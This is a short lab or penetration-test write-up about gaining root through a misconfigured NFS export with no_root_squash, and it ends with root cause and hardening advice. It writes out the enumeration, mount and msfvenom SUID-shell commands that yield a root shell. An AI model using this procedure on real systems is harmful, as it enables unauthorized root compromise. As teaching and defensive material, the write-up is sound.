
## Privilege Escalation via Misconfigured NFS (no_root_squash)
 Overview

During post-exploitation enumeration, a misconfigured NFS export was identified on the target system.
The export allowed read-write access to all clients and had no_root_squash enabled, which resulted in full root compromise of the target host.

## Enumeration


The NFS configuration on the target system was reviewed to identify exported directories and access permissions.
```bash
cat /etc/exports
```

Output:
```bash
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
Remote NFS enumeration from the attacker machine:
```bash
showmount -e 10.49.161.181
```


Output:
```bash
/tmp *
```
## Analysis

* /tmp is exported over NFS
* The share is read-write
* no_root_squash is enabled
* Any root user on an NFS client is treated as root on the server

 This configuration allows direct privilege escalation.

## Exploitation
 Mounting the NFS share

The exported /tmp directory was mounted on the attacking machine.
```bash
mkdir /tmp/1
mount -o rw,vers=3 10.49.161.181:/tmp /tmp/1
```
 Preparing a SUID payload

A SUID-enabled payload was placed on the mounted NFS share.
Due to no_root_squash, file ownership and permissions were preserved as root on the target system.
```bash
msfvenom -p linux/x64/exec CMD="/bin/sh" -f elf -o shell
chmod +xs shell
````
 Executing the payload on the target

Once executed on the target system, the payload spawned a root shell.
```bash
./shell
```

Result:
```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

 Root access successfully obtained

## Root Cause Analysis

* The privilege escalation was possible due to the following misconfigurations:
* no_root_squash enabled on the NFS export
* Writable directory (/tmp) shared with all clients
* Root privileges preserved across NFS mounts
* No client restrictions or access controls applied

## Mitigation & Hardening

To prevent this type of attack, the following mitigations should be applied:

1.) Secure NFS configuration

2.) Remove no_root_squash (use default root_squash)

3.) Restrict exports to specific IP addresses

4.) Avoid exporting world-writable directories such as /tmp

 Example of a secure NFS export
```bash
/tmp 192.168.1.10(ro,sync,root_squash,no_subtree_check)
```
